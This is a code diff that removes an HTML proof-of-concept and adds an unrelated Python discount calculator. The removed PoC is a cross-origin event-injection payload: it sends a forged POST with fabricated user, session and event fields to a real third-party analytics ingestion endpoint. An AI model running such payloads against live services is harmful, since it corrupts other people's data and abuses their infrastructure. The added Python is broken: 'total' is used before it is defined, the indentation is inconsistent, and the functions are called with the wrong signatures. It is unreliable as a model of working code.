@@ -1,31 +1,28 @@
-<!doctype html>
-<html>
+import cv2 as cv
+import numpy as np
+import random
+import math
 
-<body>
-    <h1>CORS / Cross-Origin Event Injection PoC</h1>
+costs = 0
 
-    <script>
-        fetch("https://in.grammarly.com/v1/events/ingestion_coda?datasetName=client_event", {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain;charset=UTF-8"
-            },
-            body: JSON.stringify({
-                client: "coda",
-                client_version: "poc",
-                event_name: "cors_poc_event",
-                nonce: Math.floor(Math.random() * 9999999),
-                client_event_epoch: Date.now(),
-                coda_user_id: "victim_browser",
-                doc_id: "cors_poc",
-                event_data: "{\"poc\":\"cross_origin_event_injected\"}",
-                user_agent: navigator.userAgent,
-                client_url: "/cors/poc",
-                session_id: "cors-session",
-                is_new_session: false,
-                event_id: crypto.randomUUID()
-            })
-        });
+def costs_calculate(self):
 
-        document.body.innerHTML += "<p>Cross-origin POST request sent.</p>
+ for a in range(4):
+    
+    names = input("product name:")
+    costs = float(input("product cost:"))
+
+ print(names, "added")
+ total += costs
+
+ if (total < 1000 and total > 600):
+    new_total = total * 0.8
+ elif(total < 600 and total > 200):
+    new_total = total * 0.75
+ else:
+    new_total = total
+
+ print("Total costs: ", new_total)
+
+def __init__():
+   costs_calculate()
